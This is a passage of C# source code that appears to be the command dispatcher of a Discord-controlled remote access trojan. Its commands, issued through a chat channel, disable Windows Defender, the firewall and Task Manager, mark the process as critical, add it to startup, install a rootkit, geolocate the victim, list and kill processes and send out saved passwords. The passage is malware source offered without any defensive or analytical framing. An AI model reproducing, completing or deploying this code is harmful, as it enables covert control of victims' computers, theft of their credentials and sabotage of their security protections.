                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!prockill":
                    await ProcKill(ChannelId, message_data);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!disabledefender":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await DisableDefender(ChannelId);
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!disablefirewall":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await DisableFirewall(ChannelId);
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!audio":
                    if (attachment_urls.Length > 0)
                    {
                        await PlayAudio(ChannelId, await LinkToBytes(attachment_urls[0]));
                    }
                    else
                    {
                        await Send_message(ChannelId, "Could not find attachment!");
                    }
                    break;
                case "!critproc":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        critproc();
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!uncritproc":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        uncritproc();
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!website":
                    try
                    {
                        string site = message_data.Trim();
                        if (string.IsNullOrWhiteSpace(site))
                        {
                            await Send_message(ChannelId, "Usage: !website https://example.com");
                            break;
                        }
                        if (!site.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && !site.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                        {
                            site = "https://" + site;
                        }
                        Process.Start(site);
                        await Send_message(ChannelId, "Command executed!");
                    }
                    catch
                    {
                        await Send_message(ChannelId, "Error opening website!");
                    }
                    break;
                case "!disabletaskmgr":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        DisableTaskManager();
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!enabletaskmgr":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        EnableTaskManager();
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!startup":
                    await Send_message(ChannelId, AddToStartup());
                    break;
                case "!geolocate":
                    await Send_message(ChannelId, await geolocate());
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!listprocess":
                    await getprocs(ChannelId);
                    break;
                case "!password":
                    await sendpassword(ChannelId);
                    break;
                case "!rootkit":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await Rootkit(ChannelId);
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!unrootkit":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await UnRootkit(ChannelId);
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!help":
                    await helpmenu(ChannelId);
                    break;
            }
        }
   }
}
